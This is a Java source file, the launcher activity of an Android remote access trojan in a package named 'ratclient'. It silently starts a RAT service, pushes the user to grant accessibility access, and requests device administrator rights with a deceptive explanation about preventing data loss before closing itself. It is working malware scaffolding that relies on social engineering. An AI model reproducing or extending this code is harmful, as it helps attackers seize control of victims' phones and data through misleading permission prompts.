package io.github.ratclient;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.text.TextUtils;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // 1. Start RAT service
        Intent serviceIntent = new Intent(this, RatService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        // 2. Request accessibility permission if not granted (first run only)
        if (!isAccessibilityEnabled()) {
            openAccessibilitySettings();
            return; // finish() will be called in onResume after user returns
        }

        // 3. Request device admin if not active (first run only)
        if (!isDeviceAdminActive()) {
            requestDeviceAdmin();
            return;
        }

        finish();
    }

    @Override
    protected void onResume() {
        super.onResume();
        // After user returns from Settings — check again and finish
        finish();
    }

    // ── Accessibility ────────────────────────────────────────────────────────

    private boolean isAccessibilityEnabled() {
        String serviceName = getPackageName() + "/"
            + RatAccessibilityService.class.getName();
        try {
            int enabled = Settings.Secure.getInt(
                getContentResolver(),
                Settings.Secure.ACCESSIBILITY_ENABLED, 0);
            if (enabled != 1) return false;

            String services = Settings.Secure.getString(
                getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (services == null) return false;

            for (String s : services.split(":")) {
                if (s.equalsIgnoreCase(serviceName)) return true;
            }
        } catch (Exception e) { /* ignore */ }
        return false;
    }

    private void openAccessibilitySettings() {
        // Opens system Accessibility Settings — user sees app listed there
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    // ── Device Admin ─────────────────────────────────────────────────────────

    private boolean isDeviceAdminActive() {
        DevicePolicyManager dpm =
            (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(this, RatDeviceAdmin.class);
        return dpm != null && dpm.isAdminActive(admin);
    }

    private void requestDeviceAdmin() {
        ComponentName admin = new ComponentName(this, RatDeviceAdmin.class);
        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
        // Message shown in the system activation dialog
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
            "Required to keep system services running and prevent data loss.");
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }
}
